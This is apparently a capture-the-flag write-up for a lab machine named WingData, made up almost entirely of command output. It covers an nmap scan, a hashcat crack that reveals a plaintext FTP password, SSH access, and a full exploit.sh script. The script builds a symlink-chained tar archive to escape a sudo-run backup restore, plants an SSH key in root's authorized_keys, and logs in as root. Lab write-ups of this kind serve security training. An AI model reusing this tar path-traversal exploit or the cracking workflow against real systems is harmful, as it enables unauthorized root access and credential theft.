
---

# Recon

```bash
 nmapf 10.129.224.173
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 00:07 -0500
Initiating Ping Scan at 00:07
Scanning 10.129.224.173 [4 ports]
Completed Ping Scan at 00:07, 0.41s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:07
Scanning wingdata.htb (10.129.224.173) [65535 ports]
Discovered open port 80/tcp on 10.129.224.173
Discovered open port 22/tcp on 10.129.224.173
Completed SYN Stealth Scan at 00:07, 15.35s elapsed (65535 total ports)
Nmap scan report for wingdata.htb (10.129.224.173)
Host is up, received echo-reply ttl 63 (1.0s latency).
Scanned at 2026-02-15 00:07:07 EST for 15s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
           Raw packets sent: 131080 (5.767MB) | Rcvd: 42 (4.982KB)
-e [*] IP: 10.129.224.173
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 00:07 -0500
Nmap scan report for wingdata.htb (10.129.224.173)
Host is up (0.86s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: WingData Solutions
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.30 seconds
```


https://www.wftpserver.com/help/ftpserver/index.html?compression.htm
![[Pasted image 20260215021953.png]]


```bash
hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 5 8645HS w/ Radeon 760M Graphics, 1456/2912 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (917 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Sun Feb 15 00:18:10 2026 (5 secs)
Time.Estimated...: Sun Feb 15 00:18:15 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2906.3 kH/s (0.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344385 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14340096/14344385 (99.97%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !carolyn ->  ladykitz
Hardware.Mon.#01.: Util: 25%

Started: Sun Feb 15 00:17:49 2026
Stopped: Sun Feb 15 00:18:17 2026
```

```bash
 ssh wacky@wingdata.htb
wacky@wingdata.htb's password:
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 15 00:21:44 2026 from 10.10.17.19
wacky@wingdata:~$ cat user.txt
7fba3a980d542a9b5b22a20beeb0fed6
```

```bash
wacky@wingdata:/tmp$ chmod +x exploit.sh
wacky@wingdata:/tmp$ ./exploit.sh
[+] Generating SSH key...
[+] Building exploit tar...
[+] Exploit archive ready!
[+] Running restore exploit...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_poc
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_poc
[+] Checking exploit...
POC_WORKED[+] Connecting as root...
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 15 00:38:38 2026 from ::1
root@wingdata:~# cd ro
-bash: cd: ro: No such file or directory
root@wingdata:~# ls
root.txt
root@wingdata:~# car t
-bash: car: command not found
root@wingdata:~# cat root.txt
3c61b0e6b3c65a0ca447407bff1ece09
root@wingdata:~# cat /tmp/exploit.sh
#!/bin/bash

echo "[+] Generating SSH key..."
cd /tmp || exit
ssh-keygen -t rsa -N "" -f ./root_key -q

echo "[+] Building exploit tar..."
python3 << 'EOF'
import tarfile, os, io, sys

with open('/tmp/root_key.pub', 'r') as f:
    ssh_key = f.read()

comp = 'd' * (247)
steps = 'abcdefghijklmnop'
path = ''

with tarfile.open('/opt/backup_clients/backups/backup_9999.tar', 'w') as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join('/'.join(steps), 'l'*254)

    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = '../' * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo('escape')
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + '/../../../../root/.ssh/authorized_keys'
    tar.addfile(e)

    content = ssh_key.encode()
    key_file = tarfile.TarInfo('escape')
    key_file.size = len(content)
    tar.addfile(key_file, fileobj=io.BytesIO(content))

    test = tarfile.TarInfo('test')
    test.type = tarfile.SYMTYPE
    test.linkname = linkpath + '/../../../../tmp/poc_worked.txt'
    tar.addfile(test)

    data = b'POC_WORKED'
    tf = tarfile.TarInfo('test')
    tf.size = len(data)
    tar.addfile(tf, fileobj=io.BytesIO(data))

print("[+] Exploit archive ready!")
EOF

echo "[+] Running restore exploit..."
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
-b backup_9999.tar -r restore_poc

sleep 1

echo "[+] Checking exploit..."
cat /tmp/poc_worked.txt 2>/dev/null

echo "[+] Connecting as root..."
chmod 600 /tmp/root_key
ssh -o StrictHostKeyChecking=no -i /tmp/root_key root@localhost
```